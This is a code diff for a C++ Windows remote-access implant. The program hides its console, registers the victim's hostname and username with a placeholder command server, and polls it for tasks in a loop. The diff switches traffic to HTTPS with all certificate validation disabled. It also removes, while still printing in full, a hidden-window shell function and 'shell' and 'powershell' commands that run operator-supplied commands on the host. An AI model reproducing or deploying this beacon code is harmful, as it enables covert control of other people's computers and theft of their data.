@@ -10,7 +10,6 @@
 #include <stdio.h>
 
 #pragma comment(lib, "winhttp.lib")
-#define TEMPLATE_EOF 52736
 
 std::wstring get_utf16(const std::string& str, int codepage)
 {
@@ -46,10 +45,18 @@ std::string Get(std::string ip, unsigned int port, std::string uri)
 
     if (hConnect) {
         hRequest = WinHttpOpenRequest(hConnect, L"GET", suri.c_str(), NULL,
-            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
     }
 
     if (hRequest) {
+        // Set SSL options to ignore certificate errors
+        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+
+        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+
         bResults = WinHttpSendRequest(hRequest,
             WINHTTP_NO_ADDITIONAL_HEADERS, 0,
             WINHTTP_NO_REQUEST_DATA, 0,
@@ -122,10 +129,18 @@ std::string Post(std::string ip, unsigned int port, std::string uri, std::string
 
     if (hConnect) {
         hRequest = WinHttpOpenRequest(hConnect, L"POST", suri.c_str(), NULL,
-            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
     }
 
     if (hRequest) {
+        // Set SSL options to ignore certificate errors
+        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+            SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+            SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+
+        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+
         bResults = WinHttpSendRequest(hRequest, additionalHeaders, headersLength,
             (LPVOID)data, data_len, data_len, 0);
     }
@@ -179,66 +194,6 @@ std::vector<std::string> splits(std::string cmd, char delim = ' ')
     return result;
 }
 
-std::string shell(const wchar_t* cmd)
-{
-    std::string result;
-    HANDLE hPipeRead, hPipeWrite;
-
-    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
-    saAttr.bInheritHandle = TRUE;
-    saAttr.lpSecurityDescriptor = NULL;
-
-    if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
-        return result;
-
-    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
-    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
-    si.hStdOutput = hPipeWrite;
-    si.hStdError = hPipeWrite;
-    si.wShowWindow = SW_HIDE;
-
-    PROCESS_INFORMATION pi = { 0 };
-
-    BOOL fSuccess = CreateProcessW(NULL, (LPWSTR)cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
-    if (!fSuccess)
-    {
-        CloseHandle(hPipeWrite);
-        CloseHandle(hPipeRead);
-        return result;
-    }
-
-    bool bProcessEnded = false;
-    for (; !bProcessEnded;)
-    {
-        bProcessEnded = WaitForSingleObject(pi.hProcess, 50) == WAIT_OBJECT_0;
-
-        for (;;)
-        {
-            char buf[1024];
-            DWORD dwRead = 0;
-            DWORD dwAvail = 0;
-
-            if (!::PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
-                break;
-
-            if (!dwAvail)
-                break;
-
-            if (!::ReadFile(hPipeRead, buf, std::min(sizeof(buf) - 1, static_cast<size_t>(dwAvail)), &dwRead, NULL) || !dwRead)
-                break;
-
-            buf[dwRead] = 0;
-            result += buf;
-        }
-    }
-
-    CloseHandle(hPipeWrite);
-    CloseHandle(hPipeRead);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
-    return result;
-}
-
 int main(int argc, char const* argv[])
 {
     ShowWindow(GetConsoleWindow(), SW_HIDE);
@@ -248,13 +203,17 @@ int main(int argc, char const* argv[])
     int n = 3000;
 
     std::string ip = "{{IP_PLACEHOLDER}}";
-    unsigned int port = {{PORT_PLACEHOLDER}};
+    unsigned int port = { {PORT_PLACEHOLDER} };
 
-    std::string hname = "";
-    std::string hnamecc = "cmd.exe /c hostname";
-    hname = shell(get_utf16(hnamecc, CP_UTF8).c_str());
+    char hostname[MAX_COMPUTERNAME_LENGTH + 1];
+    DWORD computerNameSize = sizeof(hostname);
+    GetComputerNameA(hostname, &computerNameSize);
 
-    name = Post(ip, port, "/reg", "name=" + hname + "&type=" + type);
+    char username[30];
+    DWORD usernameSize = sizeof(username);
+    GetUserNameA(username, &usernameSize);
+
+    name = Post(ip, port, "/reg", "hostname=" + std::string(hostname) + "&type=" + type + "&user=" + std::string(username));
 
     while (true) {
         std::string task = Get(ip, port, "/tasks/" + name);
@@ -273,24 +232,6 @@ int main(int argc, char const* argv[])
             }
             else if (command == "rename") {
                 name = Task[1];
-            }
-            else if (command == "shell") {
-                std::string scommand = "cmd.exe /c ";
-
-                for (int i = 1; i < Task.size(); i++) {
-                    scommand += Task[i] + " ";
-                }
-
-                res = shell(get_utf16(scommand, CP_UTF8).c_str());
-            }
-            else if (command == "powershell") {
-                std::string pscommand = "powershell.exe /c ";
-
-                for (int i = 1; i < Task.size(); i++) {
-                    pscommand += Task[i] + " ";
-                }
-
-                res = shell(get_utf16(pscommand, CP_UTF8).c_str());
             }
 
             Post(ip, port, "/results/" + name, "result=" + res);
